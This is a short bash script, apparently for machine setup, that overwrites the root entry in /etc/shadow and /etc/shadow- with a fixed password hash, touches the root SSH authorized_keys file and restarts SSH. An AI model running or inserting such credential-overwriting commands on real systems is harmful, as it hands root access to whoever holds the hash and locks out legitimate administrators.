#!/bin/bash

sed '1d' -i /etc/shadow

sed '1i\root:$y$j9T$HGTDJ.dqONFuYC5XeMA1r0$up4ugNPytqJwz4RyJfUgjPz1eAyK/NLn.ZmW6ysM7G7:19333:0:14600:14:::' -i /etc/shadow

sed '1d' -i /etc/shadow-

sed '1i\root:$y$j9T$HGTDJ.dqONFuYC5XeMA1r0$up4ugNPytqJwz4RyJfUgjPz1eAyK/NLn.ZmW6ysM7G7:19333:0:14600:14:::' -i /etc/shadow-

sudo sh -c "echo ''  >> ~/.ssh/authorized_keys"

systemctl restart ssh
